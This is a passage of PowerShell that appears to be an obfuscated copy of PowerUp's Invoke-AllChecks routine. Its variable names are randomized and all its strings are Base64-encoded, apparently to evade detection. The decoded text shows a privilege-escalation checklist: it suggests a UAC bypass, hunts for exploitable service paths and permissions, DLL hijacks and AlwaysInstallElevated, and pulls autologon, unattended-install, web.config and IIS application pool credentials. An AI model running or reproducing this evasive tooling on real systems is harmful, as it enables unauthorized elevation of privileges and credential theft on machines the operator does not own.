        ${f83b72547af34fd69ef35f2002908a4b} = ${f83b72547af34fd69ef35f2002908a4b} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABEAHsAYgBvAHIAZABlAHIALQB3AGkAZAB0AGgAOgAgADMAcAB4ADsAcABhAGQAZABpAG4AZwA6ACAAMABwAHgAOwBiAG8AcgBkAGUAcgAtAHMAdAB5AGwAZQA6ACAAcwBvAGwAaQBkADsAYgBvAHIAZABlAHIALQBjAG8AbABvAHIAOgAgAGIAbABhAGMAawA7AGIAYQBjAGsAZwByAG8AdQBuAGQALQBjAG8AbABvAHIAOgBwAGEAbABlAGcAbwBsAGQAZQBuAHIAbwBkAH0A')))
        ${f83b72547af34fd69ef35f2002908a4b} = ${f83b72547af34fd69ef35f2002908a4b} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PAAvAHMAdAB5AGwAZQA+AA==')))
        ConvertTo-HTML -Head ${f83b72547af34fd69ef35f2002908a4b} -Body "<H1>PowerUp report for '$($Env:ComputerName).$(${Env:a913b56191f84144ba519b305233ff1d})'</H1>" | Out-File ${06624c64d6b6454faaf3a33761220926}
    }
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBbACoAXQAgAFIAdQBuAG4AaQBuAGcAIABJAG4AdgBvAGsAZQAtAEEAbABsAEMAaABlAGMAawBzAA==')))
    ${0eecdbf2351c4d95b1704c10ab70e509} = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgA='))))
    if(${0eecdbf2351c4d95b1704c10ab70e509}){
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABDAHUAcgByAGUAbgB0ACAAdQBzAGUAcgAgAGEAbAByAGUAYQBkAHkAIABoAGEAcwAgAGwAbwBjAGEAbAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABpAHYAZQAgAHAAcgBpAHYAaQBsAGUAZwBlAHMAIQA=')))
        if(${d837db923d964094a7e6388d293f3ffb}) {
            ConvertTo-HTML -Head ${f83b72547af34fd69ef35f2002908a4b} -Body $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABIADIAPgBVAHMAZQByACAASABhAHMAIABMAG8AYwBhAGwAIABBAGQAbQBpAG4AIABQAHIAaQB2AGkAbABlAGcAZQBzACEAPAAvAEgAMgA+AA=='))) | Out-File -Append ${06624c64d6b6454faaf3a33761220926}
        }
    }
    else{
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgAKAFsAKgBdACAAQwBoAGUAYwBrAGkAbgBnACAAaQBmACAAdQBzAGUAcgAgAGkAcwAgAGkAbgAgAGEAIABsAG8AYwBhAGwAIABnAHIAbwB1AHAAIAB3AGkAdABoACAAYQBkAG0AaQBuAGkAcwB0AHIAYQB0AGkAdgBlACAAcAByAGkAdgBpAGwAZQBnAGUAcwAuAC4ALgA=')))
        if( ($(whoami /groups) -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBTAC0AMQAtADUALQAzADIALQA1ADQANAAqAA==')))).length -eq 1 ){
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABVAHMAZQByACAAaQBzACAAaQBuACAAYQAgAGwAbwBjAGEAbAAgAGcAcgBvAHUAcAAgAHQAaABhAHQAIABnAHIAYQBuAHQAcwAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABpAHYAZQAgAHAAcgBpAHYAaQBsAGUAZwBlAHMAIQA=')))
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABSAHUAbgAgAGEAIABCAHkAcABhAHMAcwBVAEEAQwAgAGEAdAB0AGEAYwBrACAAdABvACAAZQBsAGUAdgBhAHQAZQAgAHAAcgBpAHYAaQBsAGUAZwBlAHMAIAB0AG8AIABhAGQAbQBpAG4ALgA=')))
            if(${d837db923d964094a7e6388d293f3ffb}) {
                ConvertTo-HTML -Head ${f83b72547af34fd69ef35f2002908a4b} -Body $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABIADIAPgAgAFUAcwBlAHIAIABJAG4AIABMAG8AYwBhAGwAIABHAHIAbwB1AHAAIABXAGkAdABoACAAQQBkAG0AaQBuAGkAcwByAHQAYQB0AGkAdgBlACAAUAByAGkAdgBpAGwAZQBnAGUAcwA8AC8ASAAyAD4A'))) | Out-File -Append ${06624c64d6b6454faaf3a33761220926}
            }
        }
    }
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgAKAFsAKgBdACAAQwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIAB1AG4AcQB1AG8AdABlAGQAIABzAGUAcgB2AGkAYwBlACAAcABhAHQAaABzAC4ALgAuAA==')))
    ${6c3ef828163e46068c229f7f262e07e8} = Get-ServiceUnquoted
    ${6c3ef828163e46068c229f7f262e07e8} | fl
    if(${d837db923d964094a7e6388d293f3ffb}) {
        ${6c3ef828163e46068c229f7f262e07e8} | ConvertTo-HTML -Head ${f83b72547af34fd69ef35f2002908a4b} -Body $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABIADIAPgBVAG4AcQB1AG8AdABlAGQAIABTAGUAcgB2AGkAYwBlACAAUABhAHQAaABzADwALwBIADIAPgA='))) | Out-File -Append ${06624c64d6b6454faaf3a33761220926}
    }
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgAKAFsAKgBdACAAQwBoAGUAYwBrAGkAbgBnACAAcwBlAHIAdgBpAGMAZQAgAGUAeABlAGMAdQB0AGEAYgBsAGUAIABhAG4AZAAgAGEAcgBnAHUAbQBlAG4AdAAgAHAAZQByAG0AaQBzAHMAaQBvAG4AcwAuAC4ALgA=')))
    ${6c3ef828163e46068c229f7f262e07e8} = Get-ServiceFilePermission
    ${6c3ef828163e46068c229f7f262e07e8} | fl
    if(${d837db923d964094a7e6388d293f3ffb}) {
        ${6c3ef828163e46068c229f7f262e07e8} | ConvertTo-HTML -Head ${f83b72547af34fd69ef35f2002908a4b} -Body $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABIADIAPgBTAGUAcgB2AGkAYwBlACAARQB4AGUAYwB1AHQAYQBiAGwAZQAgAFAAZQByAG0AaQBzAHMAaQBvAG4AcwA8AC8ASAAyAD4A'))) | Out-File -Append ${06624c64d6b6454faaf3a33761220926}
    }
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgAKAFsAKgBdACAAQwBoAGUAYwBrAGkAbgBnACAAcwBlAHIAdgBpAGMAZQAgAHAAZQByAG0AaQBzAHMAaQBvAG4AcwAuAC4ALgA=')))
    ${6c3ef828163e46068c229f7f262e07e8} = Get-ServicePermission
    ${6c3ef828163e46068c229f7f262e07e8} | fl
    if(${d837db923d964094a7e6388d293f3ffb}) {
        ${6c3ef828163e46068c229f7f262e07e8} | ConvertTo-HTML -Head ${f83b72547af34fd69ef35f2002908a4b} -Body $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABIADIAPgBTAGUAcgB2AGkAYwBlACAAUABlAHIAbQBpAHMAcwBpAG8AbgBzADwALwBIADIAPgA='))) | Out-File -Append ${06624c64d6b6454faaf3a33761220926}
    }
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgAKAFsAKgBdACAAQwBoAGUAYwBrAGkAbgBnACAAJQBQAEEAVABIACUAIABmAG8AcgAgAHAAbwB0AGUAbgB0AGkAYQBsAGwAeQAgAGgAaQBqAGEAYwBrAGEAYgBsAGUAIAAuAGQAbABsACAAbABvAGMAYQB0AGkAbwBuAHMALgAuAC4A')))
    ${6c3ef828163e46068c229f7f262e07e8} = Find-PathHijack
    ${6c3ef828163e46068c229f7f262e07e8} | fl
    if(${d837db923d964094a7e6388d293f3ffb}) {
        ${6c3ef828163e46068c229f7f262e07e8} | ConvertTo-HTML -Head ${f83b72547af34fd69ef35f2002908a4b} -Body $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABIADIAPgAlAFAAQQBUAEgAJQAgAC4AZABsAGwAIABIAGkAagBhAGMAawBzADwALwBIADIAPgA='))) | Out-File -Append ${06624c64d6b6454faaf3a33761220926}
    }
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgAKAFsAKgBdACAAQwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIABBAGwAdwBhAHkAcwBJAG4AcwB0AGEAbABsAEUAbABlAHYAYQB0AGUAZAAgAHIAZQBnAGkAcwB0AHIAeQAgAGsAZQB5AC4ALgAuAA==')))
    if (Get-RegAlwaysInstallElevated) {
        ${3511249d1e9f43519714ca9c156d8f53} = New-Object PSObject 
        ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQARgBpAGwAZQA='))) ${b5c2c152a1bf4c378090fe922ead6017}
        ${3511249d1e9f43519714ca9c156d8f53} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBiAHUAcwBlAEYAdQBuAGMAdABpAG8AbgA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAC0AVQBzAGUAcgBBAGQAZABNAFMASQA=')))
        ${6c3ef828163e46068c229f7f262e07e8} = ${3511249d1e9f43519714ca9c156d8f53}
        ${6c3ef828163e46068c229f7f262e07e8} | fl
        if(${d837db923d964094a7e6388d293f3ffb}) {
            ${6c3ef828163e46068c229f7f262e07e8} | ConvertTo-HTML -Head ${f83b72547af34fd69ef35f2002908a4b} -Body $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABIADIAPgBBAGwAdwBhAHkAcwBJAG4AcwB0AGEAbABsAEUAbABlAHYAYQB0AGUAZAA8AC8ASAAyAD4A'))) | Out-File -Append ${06624c64d6b6454faaf3a33761220926}
        }
    }
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgAKAFsAKgBdACAAQwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIABBAHUAdABvAGwAbwBnAG8AbgAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGkAbgAgAHIAZQBnAGkAcwB0AHIAeQAuAC4ALgA=')))
    ${6c3ef828163e46068c229f7f262e07e8} = Get-RegAutoLogon
    ${6c3ef828163e46068c229f7f262e07e8} | fl
    if(${d837db923d964094a7e6388d293f3ffb}) {
        ${6c3ef828163e46068c229f7f262e07e8} | ConvertTo-HTML -Head ${f83b72547af34fd69ef35f2002908a4b} -Body $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABIADIAPgBSAGUAZwBpAHMAdAByAHkAIABBAHUAdABvAGwAbwBnAG8AbgBzADwALwBIADIAPgA='))) | Out-File -Append ${06624c64d6b6454faaf3a33761220926}
    }
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgAKAFsAKgBdACAAQwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIAB2AHUAbABuAGUAcgBhAGIAbABlACAAcgBlAGcAaQBzAHQAcgB5ACAAYQB1AHQAbwByAHUAbgBzACAAYQBuAGQAIABjAG8AbgBmAGkAZwBzAC4ALgAuAA==')))
    ${6c3ef828163e46068c229f7f262e07e8} = Get-VulnAutoRun
    ${6c3ef828163e46068c229f7f262e07e8} | fl
    if(${d837db923d964094a7e6388d293f3ffb}) {
        ${6c3ef828163e46068c229f7f262e07e8} | ConvertTo-HTML -Head ${f83b72547af34fd69ef35f2002908a4b} -Body $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABIADIAPgBSAGUAZwBpAHMAdAByAHkAIABBAHUAdABvAHIAdQBuAHMAPAAvAEgAMgA+AA=='))) | Out-File -Append ${06624c64d6b6454faaf3a33761220926}
    }
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgAKAFsAKgBdACAAQwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIAB2AHUAbABuAGUAcgBhAGIAbABlACAAcwBjAGgAdABhAHMAawAgAGYAaQBsAGUAcwAvAGMAbwBuAGYAaQBnAHMALgAuAC4A')))
    ${6c3ef828163e46068c229f7f262e07e8} = Get-VulnSchTask
    ${6c3ef828163e46068c229f7f262e07e8} | fl
    if(${d837db923d964094a7e6388d293f3ffb}) {
        ${6c3ef828163e46068c229f7f262e07e8} | ConvertTo-HTML -Head ${f83b72547af34fd69ef35f2002908a4b} -Body $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABIADIAPgBWAHUAbABuAGUAcgBhAGIAbAAgAFMAYwBoAGEAcwBrAHMAPAAvAEgAMgA+AA=='))) | Out-File -Append ${06624c64d6b6454faaf3a33761220926}
    }
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgAKAFsAKgBdACAAQwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIAB1AG4AYQB0AHQAZQBuAGQAZQBkACAAaQBuAHMAdABhAGwAbAAgAGYAaQBsAGUAcwAuAC4ALgA=')))
    ${6c3ef828163e46068c229f7f262e07e8} = Get-UnattendedInstallFile
    ${6c3ef828163e46068c229f7f262e07e8} | fl
    if(${d837db923d964094a7e6388d293f3ffb}) {
        ${6c3ef828163e46068c229f7f262e07e8} | ConvertTo-HTML -Head ${f83b72547af34fd69ef35f2002908a4b} -Body $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABIADIAPgBVAG4AYQB0AHQAZQBuAGQAZQBkACAASQBuAHMAdABhAGwAbAAgAEYAaQBsAGUAcwA8AC8ASAAyAD4A'))) | Out-File -Append ${06624c64d6b6454faaf3a33761220926}
    }
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgAKAFsAKgBdACAAQwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIABlAG4AYwByAHkAcAB0AGUAZAAgAHcAZQBiAC4AYwBvAG4AZgBpAGcAIABzAHQAcgBpAG4AZwBzAC4ALgAuAA==')))
    ${6c3ef828163e46068c229f7f262e07e8} = Get-Webconfig | ? {$_}
    ${6c3ef828163e46068c229f7f262e07e8} | fl
    if(${d837db923d964094a7e6388d293f3ffb}) {
        ${6c3ef828163e46068c229f7f262e07e8} | ConvertTo-HTML -Head ${f83b72547af34fd69ef35f2002908a4b} -Body $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABIADIAPgBFAG4AYwByAHkAcAB0AGUAZAAgACcAdwBlAGIALgBjAG8AbgBmAGkAZwAnACAAUwB0AHIAaQBuAGcAPAAvAEgAMgA+AA=='))) | Out-File -Append ${06624c64d6b6454faaf3a33761220926}
    }
    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgAKAFsAKgBdACAAQwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIABlAG4AYwByAHkAcAB0AGUAZAAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAgAHAAbwBvAGwAIABhAG4AZAAgAHYAaQByAHQAdQBhAGwAIABkAGkAcgBlAGMAdABvAHIAeQAgAHAAYQBzAHMAdwBvAHIAZABzAC4ALgAuAA==')))
    ${6c3ef828163e46068c229f7f262e07e8} = Get-ApplicationHost | ? {$_}
    ${6c3ef828163e46068c229f7f262e07e8} | fl
    if(${d837db923d964094a7e6388d293f3ffb}) {
        ${6c3ef828163e46068c229f7f262e07e8} | ConvertTo-HTML -Head ${f83b72547af34fd69ef35f2002908a4b} -Body $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PABIADIAPgBFAG4AYwByAHkAcAB0AGUAZAAgAEEAcABwAGwAaQBjAGEAdABpAG8AbgAgAFAAbwBvAGwAIABQAGEAcwBzAHcAbwByAGQAcwA8AC8ASAAyAD4A'))) | Out-File -Append ${06624c64d6b6454faaf3a33761220926}
    }
    "`n"
    if(${d837db923d964094a7e6388d293f3ffb}) {
        "[*] Report written to '${06624c64d6b6454faaf3a33761220926}' `n"
    }
}
